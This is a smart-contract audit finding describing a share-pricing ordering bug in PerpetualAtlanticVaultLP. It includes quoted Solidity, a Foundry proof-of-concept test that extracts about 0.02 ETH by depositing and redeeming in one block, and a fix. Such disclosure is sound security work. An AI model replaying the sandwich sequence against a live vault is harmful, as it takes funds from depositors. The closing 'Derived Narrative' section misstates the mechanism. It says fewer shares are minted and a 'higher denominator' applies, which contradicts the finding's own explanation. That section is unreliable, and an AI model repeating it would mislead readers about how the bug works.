---
id: 19139
severity: "High"
---

# Users can get immediate profit when deposit and redeem in `PerpetualAtlanticVaultLP`

## Description

Due to wrong order between `previewDeposit` and `updateFunding` inside `PerpetualAtlanticVaultLP.deposit`. In some case, user can get immediate profit when call `deposit` and `redeem` in the same block.

## Proof of Concept

When `deposit` is called, first `previewDeposit` will be called to get the `shares` based on `assets` provided.

```solidity
function deposit(
  uint256 assets,
  address receiver
) public virtual returns (uint256 shares) {
  // Check for rounding error since we round down in previewDeposit.
  require((shares = previewDeposit(assets)) != 0, "ZERO_SHARES");

  perpetualAtlanticVault.updateFunding();

  // Need to transfer before minting or ERC777s could reenter.
  collateral.transferFrom(msg.sender, address(this), assets);

  _mint(receiver, shares);

  _totalCollateral += assets;

  emit Deposit(msg.sender, receiver, assets, shares);
}
```

Inside `previewDeposit`, it will call `convertToShares` to calculate the shares.

```solidity
function previewDeposit(uint256 assets) public view returns (uint256) {
  return convertToShares(assets);
}
```

`convertToShares` calculate shares based on the provided `assets`, `supply` and `totalVaultCollateral`. `_totalCollateral` is also part of `totalVaultCollateral` that will be used inside the calculation.

```solidity
function convertToShares(
  uint256 assets
) public view returns (uint256 shares) {
  uint256 supply = totalSupply;
  uint256 rdpxPriceInAlphaToken = perpetualAtlanticVault.getUnderlyingPrice();

  uint256 totalVaultCollateral = totalCollateral() +
    ((_rdpxCollateral * rdpxPriceInAlphaToken) / 1e8);
  return
    supply == 0 ? assets : assets.mulDivDown(supply, totalVaultCollateral);
}
```

After the shares calculation, `perpetualAtlanticVault.updateFunding` will be called, this function will send collateral to vault LP if conditions are met and increase `_totalCollateral`.

```solidity
function updateFunding() public {
  updateFundingPaymentPointer();
  uint256 currentFundingRate = fundingRates[latestFundingPaymentPointer];
  uint256 startTime = lastUpdateTime == 0
    ? (nextFundingPaymentTimestamp() - fundingDuration)
    : lastUpdateTime;
  lastUpdateTime = block.timestamp;

  collateralToken.safeTransfer(
    addresses.perpetualAtlanticVaultLP,
    (currentFundingRate * (block.timestamp - startTime)) / 1e18
  );

  IPerpetualAtlanticVaultLP(addresses.perpetualAtlanticVaultLP).addProceeds(
    (currentFundingRate * (block.timestamp - startTime)) / 1e18
  );

  emit FundingPaid(
    msg.sender,
    ((currentFundingRate * (block.timestamp - startTime)) / 1e18),
    latestFundingPaymentPointer
  );
}
```

It means if `_totalCollateral` is increased, user can get immediate profit when they call `redeem`.

```solidity
function redeem(
  uint256 shares,
  address receiver,
  address owner
) public returns (uint256 assets, uint256 rdpxAmount) {
  perpetualAtlanticVault.updateFunding();

  if (msg.sender != owner) {
    uint256 allowed = allowance[owner][msg.sender]; // Saves gas for limited approvals.

    if (allowed != type(uint256).max) {
      allowance[owner][msg.sender] = allowed - shares;
    }
  }
  (assets, rdpxAmount) = redeemPreview(shares);

  // Check for rounding error since we round down in previewRedeem.
  require(assets != 0, "ZERO_ASSETS");

  _rdpxCollateral -= rdpxAmount;

  beforeWithdraw(assets, shares);

  _burn(owner, shares);

  collateral.transfer(receiver, assets);

  IERC20WithBurn(rdpx).safeTransfer(receiver, rdpxAmount);

  emit Withdraw(msg.sender, receiver, owner, assets, shares);
}
```

When `redeemPreview` is called and trigger `_convertToAssets`, it will used this newly increased `_totalCollateral`.

```solidity
function _convertToAssets(
  uint256 shares
) internal view virtual returns (uint256 assets, uint256 rdpxAmount) {
  uint256 supply = totalSupply;
  return
    (supply == 0)
      ? (shares, 0)
      : (
        shares.mulDivDown(totalCollateral(), supply),
        shares.mulDivDown(_rdpxCollateral, supply)
      );
}
```

This will open sandwich and MEV attack opportunity inside vault LP.

Foundry PoC:

Add this test to `Unit` contract inside `/tests/rdpxV2-core/Unit.t.sol`, also add `import "forge-std/console.sol";` in the contract:

```solidity
function testSandwichProvideFunding() public {
    rdpxV2Core.bond(20 * 1e18, 0, address(this));
    rdpxV2Core.bond(20 * 1e18, 0, address(this));
    skip(86400 * 7);
    vault.addToContractWhitelist(address(rdpxV2Core));
    vault.updateFundingPaymentPointer();

    // test funding succesfully
    uint256[] memory strikes = new uint256[](1);
    strikes[0] = 15e6;
    // calculate funding is done properly
    vault.calculateFunding(strikes);

    uint256 funding = vault.totalFundingForEpoch(
        vault.latestFundingPaymentPointer()
    );

    // send funding to rdpxV2Core and call sync
    weth.transfer(address(rdpxV2Core), funding);
    rdpxV2Core.sync();
    rdpxV2Core.provideFunding();
    skip(86400 * 6);
    uint256 balanceBefore = weth.balanceOf(address(this));
    console.log("balance of eth before deposit and redeem:");
    console.log(balanceBefore);
    weth.approve(address(vaultLp), type(uint256).max);
    uint256 shares = vaultLp.deposit(1e18, address(this));
    vaultLp.redeem(shares, address(this), address(this));
    uint256 balanceAfter = weth.balanceOf(address(this));
    console.log("balance after deposit and redeem:");
    console.log(balanceAfter);
    console.log("immediate profit :");
    console.log(balanceAfter - balanceBefore);
}
```

Run the test:

```
forge test --match-contract Unit --match-test testSandwichProvideFunding -vvv
```

Log Output:

```
Logs:
  balance of eth before deposit and redeem:
  18665279470073000000000

  balance after deposit and redeem:
  18665299797412715619861

  immediate profit :
  20327339715619861
```

## Recommendation

Move `perpetualAtlanticVault.updateFunding` before `previewDeposit` is calculated.

```solidity
function deposit(
  uint256 assets,
  address receiver
) public virtual returns (uint256 shares) {
  perpetualAtlanticVault.updateFunding();
  // Check for rounding error since we round down in previewDeposit.
  require((shares = previewDeposit(assets)) != 0, "ZERO_SHARES");

  // Need to transfer before minting or ERC777s could reenter.
  collateral.transferFrom(msg.sender, address(this), assets);

  _mint(receiver, shares);

  _totalCollateral += assets;

  emit Deposit(msg.sender, receiver, assets, shares);
}
```

Please bump this to high

## Derived Narrative

The following field is derived content and may not be source-grounded:

The vulnerability is an ordering flaw in the deposit function of the PerpetualAtlanticVaultLP contract that allows a user to obtain an immediate profit by depositing and redeeming in the same block. The function first calls previewDeposit, which calculates the number of shares to mint based on the current total collateral, and only afterwards calls updateFunding, which adds newly accrued funding to the vault’s total collateral. Because the share price is computed before the funding increase, the user receives a slightly lower amount of shares for the assets supplied. When the same user calls redeem in the same block, updateFunding has already increased the total collateral, so the conversion from shares back to assets uses a higher denominator, resulting in more assets being returned than were originally deposited. This creates a profit without any market movement. The issue occurs whenever deposit and redeem are executed within the same block and the funding update condition is met, which can be triggered by any participant but is especially attractive to bots that can front‑run or sandwich other users’ transactions. The impact is a direct loss of collateral from the vault, erosion of trust in the protocol, and a potential drain of funds if the attack is repeated at scale. The bug was discovered during a Code4rena audit by writing a Foundry test that measured the balance before and after a deposit‑redeem sequence and observed a positive delta of roughly 0.02 ETH. The problem is subtle because the deposit and redeem calls appear normal and the profit per transaction is small, making it easy to miss in manual testing. The flaw belongs to the class of state‑inconsistency or ordering bugs, where a contract’s internal accounting is updated out of sync with user‑visible calculations, leading to exploitable arithmetic discrepancies. From a user’s perspective the UI would show a normal deposit confirmation followed by a redeem that returns more tokens than were supplied, violating the expectation that “what I put in is what I get out”. To remediate the issue the funding update must be performed before the share preview calculation, ensuring that both deposit and redeem use the same up‑to‑date total collateral value. Alternatively, the contract could lock the funding state for the duration of the deposit‑redeem cycle or compute shares after the funding adjustment, thereby eliminating the profit window.
